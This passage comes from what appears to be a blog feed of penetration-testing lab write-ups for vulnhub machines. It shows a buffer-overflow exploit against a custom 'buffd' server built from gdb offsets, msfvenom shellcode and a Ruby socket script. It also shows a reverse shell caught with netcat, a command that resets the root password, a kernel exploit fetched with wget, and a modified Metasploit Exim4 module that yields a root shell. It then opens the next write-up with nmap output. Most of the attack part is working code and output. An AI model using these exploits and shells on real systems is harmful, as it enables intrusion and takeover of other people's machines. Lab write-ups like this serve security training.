</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">sigaction</span><span class="p">(</span><span class="n">SIGCHLD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">sa</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">sigaction</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="nl">server</span><span class="p">:</span> <span class="n">waiting</span> <span class="k">for</span> <span class="n">connections</span><span class="o">&amp;</span><span class="n">hellip</span><span class="p">;</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// main accept() loop</span>
</span><span class='line'><span class="n">sin_size</span> <span class="o">=</span> <span class="k">sizeof</span> <span class="n">their_addr</span><span class="p">;</span>
</span><span class='line'><span class="n">new_fd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">their_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">sin_size</span><span class="p">);</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">new_fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">accept</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="k">continue</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">inet_ntop</span><span class="p">(</span><span class="n">their_addr</span><span class="p">.</span><span class="n">ss_family</span><span class="p">,</span>
</span><span class='line'><span class="n">get_in_addr</span><span class="p">((</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">their_addr</span><span class="p">),</span>
</span><span class='line'><span class="n">s</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">s</span><span class="p">);</span>
</span><span class='line'><span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="nl">server</span><span class="p">:</span> <span class="n">got</span> <span class="n">connection</span> <span class="n">from</span> <span class="o">%</span><span class="n">s</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">s</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fork</span><span class="p">())</span> <span class="p">{</span> <span class="c1">// this is the child process</span>
</span><span class='line'><span class="n">close</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span> <span class="c1">// child doesn&amp;rsquo;t need the listener</span>
</span><span class='line'><span class="n">memset</span><span class="p">(</span><span class="n">net_buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
</span><span class='line'><span class="n">strcpy</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">HELO</span><span class="err">\</span><span class="nl">nCOMMAND</span><span class="p">:</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">send</span><span class="p">(</span><span class="n">new_fd</span><span class="p">,</span> <span class="n">out_buffer</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">send</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">recv</span><span class="p">(</span><span class="n">new_fd</span><span class="p">,</span> <span class="n">net_buffer</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="n">vulnerable</span><span class="p">(</span><span class="n">net_buffer</span><span class="p">);</span>
</span><span class='line'><span class="n">strcpy</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="nl">RECV</span><span class="p">:</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="n">strcat</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">,</span> <span class="n">net_buffer</span><span class="p">);</span>
</span><span class='line'><span class="n">send</span><span class="p">(</span><span class="n">new_fd</span><span class="p">,</span> <span class="n">out_buffer</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="n">close</span><span class="p">(</span><span class="n">new_fd</span><span class="p">);</span>
</span><span class='line'><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="n">close</span><span class="p">(</span><span class="n">new_fd</span><span class="p">);</span> <span class="c1">// parent doesn&amp;rsquo;t need this</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>We copy buffd binary from server (/usr/local/sbin/buffd) and using metasploit
patterns we calculate the offset for EIP. To make an exploit reliable, we are
looking also for some registers, pointing to our pattern in memory.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/repo# gdb ./buffd  -q
</span><span class='line'>Reading symbols from /root/repo/buffd&hellip;done.
</span><span class='line'>(gdb) set follow-fork-mode child
</span><span class='line'>(gdb) run
</span><span class='line'>Starting program: /root/repo/buffd
</span><span class='line'>warning: no loadable sections found in added symbol-file system-supplied DSO at 0xb7fe0000
</span><span class='line'>server: waiting for connections&hellip;
</span><span class='line'>server: got connection from 127.0.0.1
</span><span class='line'>[New process 4201]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>[Switching to process 4201]
</span><span class='line'>0x65413165 in ?? ()
</span><span class='line'>(gdb) i r
</span><span class='line'>eax            0xbfffe790       -1073748080
</span><span class='line'>ecx            0x0      0
</span><span class='line'>edx            0xca     202
</span><span class='line'>ebx            0xb7fbeff4       -1208225804
</span><span class='line'>esp            0xbfffe810       0xbfffe810
</span><span class='line'>ebp            0x41306541       0x41306541
</span><span class='line'>esi            0x0      0
</span><span class='line'>edi            0x0      0
</span><span class='line'>eip            0x65413165       0x65413165
</span><span class='line'>eflags         0x10246  [ PF ZF IF RF ]
</span><span class='line'>cs             0x73     115
</span><span class='line'>ss             0x7b     123
</span><span class='line'>ds             0x7b     123
</span><span class='line'>es             0x7b     123
</span><span class='line'>fs             0x0      0
</span><span class='line'>gs             0x33     51
</span><span class='line'>(gdb) x /5x $eax
</span><span class='line'>0xbfffe790:     0x41306141      0x61413161      0x33614132      0x41346141
</span><span class='line'>0xbfffe7a0:     0x61413561&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~# nc 127.0.0.1 7777
</span><span class='line'>HELO
</span><span class='line'>COMMAND:Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
</span><span class='line'>^C
</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x65413165
</span><span class='line'>[&lt;em>] Exact match at offset 124
</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x41306141
</span><span class='line'>[&lt;/em>] Exact match at offset 0</span></code></pre></td></tr></table></div></figure></p>

<p>EIP begins on offset 124 and the register EAX points to the beginning of our
buffer, right now filled with pattern. Luckily, we find call eax opcodes in
binary too.</p>

<p>The strange thing is that the stack in binary is marked as not executable,
but on this server the exploit works and we don&rsquo;t get segfault:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@:/home/testuser $ readelf -lW /usr/local/sbin/buffd
</span><span class='line'>Elf file type is EXEC (Executable file)
</span><span class='line'>Entry point 0x80488e0
</span><span class='line'>There are 7 program headers, starting at offset 52&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Program Headers:
</span><span class='line'>  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
</span><span class='line'>  PHDR           0x000034 0x08048034 0x08048034 0x000e0 0x000e0 R E 0x4
</span><span class='line'>  INTERP         0x000114 0x08048114 0x08048114 0x00013 0x00013 R   0x1
</span><span class='line'>      [Requesting program interpreter: /lib/ld-linux.so.2]
</span><span class='line'>  LOAD           0x000000 0x08048000 0x08048000 0x01004 0x01004 R E 0x1000
</span><span class='line'>  LOAD           0x001004 0x0804a004 0x0804a004 0x00170 0x0017c RW  0x1000
</span><span class='line'>  DYNAMIC        0x001018 0x0804a018 0x0804a018 0x000d0 0x000d0 RW  0x4
</span><span class='line'>  NOTE           0x000128 0x08048128 0x08048128 0x00020 0x00020 R   0x4
</span><span class='line'>  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4</span></code></pre></td></tr></table></div></figure></p>

<p>Exploit in Ruby:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">root</span><span class="vi">@kali32</span><span class="ss">:~</span><span class="c1"># cat exploit.rb&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;!</span><span class="sr">/usr/</span><span class="n">bin</span><span class="o">/</span><span class="n">env</span> <span class="n">ruby</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;require &amp;lsquo;socket&amp;rsquo;&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">root</span><span class="vi">@kali32</span><span class="ss">:~</span><span class="c1"># /usr/share/metasploit-framework/msfelfscan -j ebp,ebx,esp,eax repo/buffd&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;[</span><span class="n">repo</span><span class="o">/</span><span class="n">buffd</span><span class="o">]&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;0x0804898f call eax&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="mh">0x08048efb</span> <span class="n">call</span> <span class="n">eax</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;root@kali32:~# /us</span><span class="n">r</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">msfvenom</span> <span class="o">-</span><span class="nb">p</span> <span class="n">linux</span><span class="o">/</span><span class="n">x86</span><span class="o">/</span><span class="nb">exec</span> <span class="o">-</span><span class="n">b</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;\</span><span class="n">x00</span><span class="p">\</span><span class="n">xff</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="no">CMD</span><span class="o">=&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">commands</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">-</span><span class="n">f</span> <span class="n">ruby</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;buf =</span>
</span><span class='line'><span class="sr">&amp;ldquo;\xdd\xc2\xd9\x74\x24\xf4\xbd\x38\x6f\xc2\x8c\x58\x33\xc9&amp;rdquo; +</span>
</span><span class='line'><span class="sr">&amp;ldquo;\xb1\x0d\x31\x68\x18\x03\x68\x18\x83\xc0\x3c\x8d\x37\xe6&amp;rdquo; +</span>
</span><span class='line'><span class="sr">&amp;ldquo;\x37\x09\x21\xa5\x21\xc1\x7c\x29\x24\xf6\x17\x82\x45\x91&amp;rdquo; +</span>
</span><span class='line'><span class="sr">&amp;ldquo;\xe7\xb4\x86\x03\x81\x2a\x51\x20\x03\x5b\x6f\xa7\xa4\x9b&amp;rdquo; +</span>
</span><span class='line'><span class="sr">&amp;ldquo;\x40\xd3\xc9\xeb\xb1\x78\x7d\x61\xa0\x1f\xef\x1d\x49\xe0&amp;rdquo; +</span>
</span><span class='line'><span class="sr">&amp;ldquo;\xb8\x8e\x24\x01\x8b\xb1&amp;rdquo;&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="n">exploit</span> <span class="o">=</span> <span class="n">buf</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">124</span> <span class="o">-</span> <span class="n">buf</span><span class="o">.</span><span class="n">length</span><span class="p">)</span>
</span><span class='line'><span class="n">exploit</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="o">[</span><span class="mh">0x0804898f</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">V</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;host = ARGV[0]</span>
</span><span class='line'><span class="sr">host ||= &amp;ldquo;192.168.80.143&amp;rdquo;&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="nb">puts</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">Using</span> <span class="ss">host</span><span class="p">:</span> <span class="c1">#{host}&amp;rdquo;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span> <span class="n">host</span><span class="p">,</span> <span class="mi">7777</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Exploits runs arbitrary command, that we put on vulnerable server to /tmp/commands.</p>

<p>We connect to the host:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@:/home/testuser $ :backdoor.reversetcp -port 1337 192.168.80.137 -no-connect&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~# nc -lvp 1337
</span><span class='line'>listening on [any] 1337 &hellip;
</span><span class='line'>192.168.80.143: inverse host lookup failed: Unknown server error : Connection timed out
</span><span class='line'>connect to [192.168.80.137] from (UNKNOWN) [192.168.80.143] 32787
</span><span class='line'>sh: no job control in this shell
</span><span class='line'>sh-2.05b$ cd /tmp</span></code></pre></td></tr></table></div></figure></p>

<p>To obtain root privileges, we can run ssh server and put to &lsquo;commands&rsquo; the command to change root password:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>debian:/tmp# chmod +x commands
</span><span class='line'>debian:/tmp# cat commands
</span><span class='line'>echo -e &ldquo;1234\n1234\n&rdquo; | passwd</span></code></pre></td></tr></table></div></figure></p>

<p>Kernel is vulnerable too, using this exploit we can get uid 0 privileges:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-2.05b$ wget -O socksend.c &lt;a href="http://www.exploit-db.com/download/9479">http://www.exploit-db.com/download/9479&lt;/a></span></code></pre></td></tr></table></div></figure></p>

<p>In Metasploit is there is another module which we can use to exploit Exim4
(exploit/unix/smtp/exim4_string_format). To make it work correctly, we need
to comment the following lines and also change exim to exim4:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="mi">114</span>     <span class="c1">#if not datastore[&amp;lsquo;SkipVersionCheck&amp;rsquo;] and self.banner !~ /Exim 4.6\d+/i</span>
</span><span class='line'><span class="mi">115</span>     <span class="c1">#  fail_with(Failure::Unknown, &amp;ldquo;Warning: This version of Exim is not exploitable&amp;rdquo;)</span>
</span><span class='line'><span class="mi">116</span>     <span class="c1">#end</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">hellip</span><span class="p">;</span>
</span><span class='line'><span class="mi">341</span>       <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">PATH</span><span class="o">=</span><span class="sr">/bin:/s</span><span class="ss">bin</span><span class="p">:</span><span class="sr">/usr/s</span><span class="ss">bin</span><span class="p">:</span><span class="sr">/usr/</span><span class="ss">bin</span><span class="p">:</span><span class="sr">/usr/</span><span class="n">local</span><span class="o">/</span><span class="ss">sbin</span><span class="p">:</span><span class="sr">/usr/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span> <span class="n">exim4</span> <span class="o">-</span><span class="n">C</span><span class="c1">#{temp_conf} -q\n&amp;rdquo;)</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(exim4_string_format) > rexploit
</span><span class='line'>[*] Reloading module&hellip;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>[&lt;em>] Started reverse double handler
</span><span class='line'>[&lt;/em>] Connecting to 192.168.80.143:25 &hellip;
</span><span class='line'>[&lt;em>] Server: 220 localhost.localdomain ESMTP Exim 4.50 Sat, 09 May 2015 07:53:30 +0200
</span><span class='line'>[&lt;/em>] EHLO: 250-localhost.localdomain Hello cpR0uwxe.com [192.168.80.137]
</span><span class='line'>[&lt;em>] EHLO: 250-SIZE 52428800
</span><span class='line'>[&lt;/em>] EHLO: 250-PIPELINING
</span><span class='line'>[&lt;em>] EHLO: 250 HELP
</span><span class='line'>[&lt;/em>] Determined our hostname is cpR0uwxe.com and IP address is 192.168.80.137
</span><span class='line'>[&lt;em>] MAIL: 250 OK
</span><span class='line'>[&lt;/em>] RCPT: 250 Accepted
</span><span class='line'>[&lt;em>] DATA: 354 Enter message, ending with &ldquo;.&rdquo; on a line by itself
</span><span class='line'>[&lt;/em>] Constructing initial headers &hellip;
</span><span class='line'>[&lt;em>] Constructing HeaderX &hellip;
</span><span class='line'>[&lt;/em>] Constructing body &hellip;
</span><span class='line'>[&lt;em>] Sending 50 megabytes of data&hellip;
</span><span class='line'>[&lt;/em>] Ending first message.
</span><span class='line'>[&lt;em>] Result: &ldquo;552 Message size exceeds maximum permitted\r\n&rdquo;
</span><span class='line'>[&lt;/em>] Sending second message &hellip;
</span><span class='line'>[&lt;em>] MAIL result: &ldquo;250 OK\r\n&rdquo;
</span><span class='line'>[&lt;/em>] RCPT result: &ldquo;sh-2.05b$ &rdquo;
</span><span class='line'>[&lt;em>] Looking for Perl to facilitate escalation&hellip;
</span><span class='line'>[&lt;/em>] Perl binary detected, attempt to escalate&hellip;
</span><span class='line'>[&lt;em>] Using Perl interpreter at /usr/bin/perl&hellip;
</span><span class='line'>[&lt;/em>] Creating temporary files /var/tmp/oYEMVjYJ and /var/tmp/LCpxpIyv&hellip;
</span><span class='line'>[&lt;em>] Attempting to execute payload as root&hellip;
</span><span class='line'>[&lt;/em>] Accepted the first client connection&hellip;
</span><span class='line'>[&lt;em>] Accepted the second client connection&hellip;
</span><span class='line'>[&lt;/em>] Command: echo QDibz6UzrEBUyJQT;
</span><span class='line'>[&lt;em>] Writing to socket A
</span><span class='line'>[&lt;/em>] Writing to socket B
</span><span class='line'>[&lt;em>] Reading from sockets&hellip;
</span><span class='line'>[&lt;/em>] Reading from socket B
</span><span class='line'>[&lt;em>] B: &ldquo;QDibz6UzrEBUyJQT\r\n&rdquo;
</span><span class='line'>[&lt;/em>] Matching&hellip;
</span><span class='line'>[&lt;em>] A is input&hellip;
</span><span class='line'>[&lt;/em>] Command shell session 1 opened (192.168.80.137:4444 -> 192.168.80.143:32803) at 2015-05-06 07:40:24 +0200&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>id
</span><span class='line'>uid=0(root) gid=0(root)</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Holynix: V2]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/10/holynix-v2/"/>
    <updated>2015-05-10T14:35:19+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/10/holynix-v2</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/holynix-v2,21/">Holynix: v2</a></p>

<p>We set our network preferences to &ldquo;Share with my Mac&rdquo; on both vulnerable server
and Kali Linux. Our NIC address will be the following:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# ifconfig eth0:1 192.168.1.11</span></code></pre></td></tr></table></div></figure></p>

<p>Nmap output for 192.168.1.88:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE  SERVICE
</span><span class='line'>20/tcp closed ftp-data
</span><span class='line'>21/tcp open   ftp
</span><span class='line'>22/tcp open   ssh
</span><span class='line'>53/tcp open   domain
</span><span class='line'>80/tcp open   http</span></code></pre></td></tr></table></div></figure></p>

<p>We add to /etc/hosts:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.1.88 www.zincftp.com
</span><span class='line'>192.168.1.88 zincftp.com</span></code></pre></td></tr></table></div></figure></p>

<p>Asking DNS server about the domain reports:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
